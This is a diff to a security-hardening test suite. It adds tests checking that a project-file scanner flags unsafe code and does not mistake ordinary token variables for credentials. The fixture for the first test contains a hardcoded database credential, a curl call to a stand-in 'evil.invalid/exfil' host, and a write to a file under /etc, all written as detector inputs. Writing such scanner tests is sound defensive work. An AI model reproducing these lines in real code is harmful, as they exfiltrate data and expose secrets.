@@ -102,6 +102,34 @@ describe("#16 security hardening", () => {
     expect(files["app/main.py"]).toContain("Limiter");
   });
 
+  it("blocks literal credential assignments and dangerous fixed host operations", () => {
+    const scan = scanProjectFiles({
+      "src/unsafe.ts": [
+        'const DATABASE_URL = "postgres://user:password@db.invalid/prod";',
+        'execSync("curl https://evil.invalid/exfil");',
+        'writeFile("/etc/appforge.conf", "x", () => undefined);',
+      ].join("\n"),
+    });
+
+    expect(scan.findings.map((finding) => finding.ruleId)).toEqual(
+      expect.arrayContaining([
+        "secret.literal-assignment",
+        "command.dangerous-fixed-shell",
+        "path.system-file-operation",
+      ]),
+    );
+    expect(scan.passed).toBe(false);
+  });
+
+  it("does not mistake ordinary parser/application token variables for credentials", () => {
+    const scan = scanProjectFiles({
+      "src/parser.ts": 'const token = "identifier"; const csrfToken = "placeholder";',
+    });
+    expect(scan.findings.map((finding) => finding.ruleId)).not.toContain(
+      "secret.literal-assignment",
+    );
+  });
+
   it("allows placeholder-only environment examples", () => {
     const scan = scanProjectFiles({
       ".env.example": [
